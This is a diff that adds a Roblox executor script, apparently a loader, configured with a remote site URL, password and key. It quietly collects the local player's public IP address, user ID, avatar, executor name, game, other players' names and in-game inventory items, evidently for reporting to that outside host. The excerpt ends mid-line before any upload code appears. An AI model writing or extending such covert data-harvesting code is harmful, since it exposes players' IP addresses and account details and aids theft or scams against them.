@@ -1,0 +1,155 @@
+local BASE = "https://generator-crash.lovable.app"
+local SITE_SLUG = "crasher1"
+local SITE_PASSWORD = "araytakan"
+local KEY = "xenooooo"
+local LOADER_VERSION = "1.9.0"
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RobloxReplicated = game:GetService("RobloxReplicatedStorage")
+
+local genv = (getgenv and getgenv()) or _G or {}
+
+if type(genv.__XENO_CLEANUP) == "function" then pcall(genv.__XENO_CLEANUP) end
+
+genv.__XENO_SESSION = (tonumber(genv.__XENO_SESSION) or 0) + 1
+local SESSION = genv.__XENO_SESSION
+local function alive() return genv.__XENO_SESSION == SESSION end
+
+
+local function resolveRequest()
+    return http_request
+        or request
+        or (syn and syn.request)
+        or (http and http.request)
+        or (fluxus and fluxus.request)
+        or (krnl and krnl.request)
+        or genv.http_request
+        or genv.request
+        or (genv.syn and genv.syn.request)
+        or (genv.http and genv.http.request)
+end
+
+local request = resolveRequest()
+if not request then
+    local deadline = tick() + 10
+    repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
+end
+
+local function fallbackRequest(opts)
+    local method = (opts.Method or "GET"):upper()
+    if method == "POST" then
+        local ok, res = pcall(function()
+            return game:HttpPostAsync(opts.Url, opts.Body or "", "application/json")
+        end)
+        if ok then return { Body = res, StatusCode = 200, Success = true } end
+        return nil
+    end
+    local ok, res = pcall(function() return game:HttpGetAsync(opts.Url) end)
+    if ok then return { Body = res, StatusCode = 200, Success = true } end
+    ok, res = pcall(function() return game:HttpGet(opts.Url) end)
+    if ok then return { Body = res, StatusCode = 200, Success = true } end
+    return nil
+end
+
+local function httpOnce(opts)
+    if not request then request = resolveRequest() end
+    if request then
+        local ok, res = pcall(request, opts)
+        if ok and res and (res.StatusCode == nil or (res.StatusCode >= 200 and res.StatusCode < 300)) then
+            return res
+        end
+    end
+    return fallbackRequest(opts)
+end
+
+local function httpRequest(opts)
+    for attempt = 1, 3 do
+        local res = httpOnce(opts)
+        if res then return res end
+        task.wait(0.2 * attempt)
+    end
+    return nil
+end
+
+
+local LP = Players.LocalPlayer
+if not LP then
+    local deadline = tick() + 30
+    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
+end
+if not LP then return end
+
+local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end
+
+local executorName = "unknown"
+do
+    local ok, name = pcall(function()
+        if identifyexecutor then return (identifyexecutor()) end
+        return nil
+    end)
+    if ok and type(name) == "string" and name ~= "" then executorName = name end
+end
+
+local cachedGameName = nil
+local function gameName()
+    if cachedGameName then return cachedGameName end
+    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+    if info and info.Name then cachedGameName = info.Name end
+    return cachedGameName or "Unknown Game"
+end
+
+local clientIp = ""
+task.spawn(function()
+    local ok, ip = pcall(function() return game:HttpGet("https://api.ipify.org") end)
+    if ok and type(ip) == "string" then
+        ip = ip:gsub("%s+", "")
+        if #ip > 0 and #ip < 64 then clientIp = ip end
+    end
+    if clientIp == "" then
+        local res = httpOnce({ Url = "https://api.ipify.org", Method = "GET" })
+        if res and type(res.Body) == "string" then
+            local b = res.Body:gsub("%s+", "")
+            if #b > 0 and #b < 64 then clientIp = b end
+        end
+    end
+end)
+
+local function avatarUrl()
+    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
+end
+
+local function serverPlayers()
+    local t = {}
+    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
+    return t
+end
+
+local function collectBrainrots()
+    local list = {}
+    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
+    if not pg then return list end
+
+    local possibleGUIs = {
+        "DuelsMachineSession",
+        "DuelsMachine",
+        "BrainrotUI",
+        "BrainrotSession",
+        "SessionGUI",
+        "DuelsGUI",
+    }
+
+    local gui = nil
+    for _, name in ipairs(possibleGUIs) do
+        gui = safe(function() return pg:FindFirstChild(name) end)
+        if gui then break end
+    end
+    if not gui then return list end
+
+    local targetFrame = nil
+    local function findFrame(container)
+        if not container then return end
+        for _, child in ipairs(container:GetChildren()) do
+            if child:IsA("Frame") and (child.Name == "ScrollingFrame" or child.Name == "ListFrame" or child.Name ==
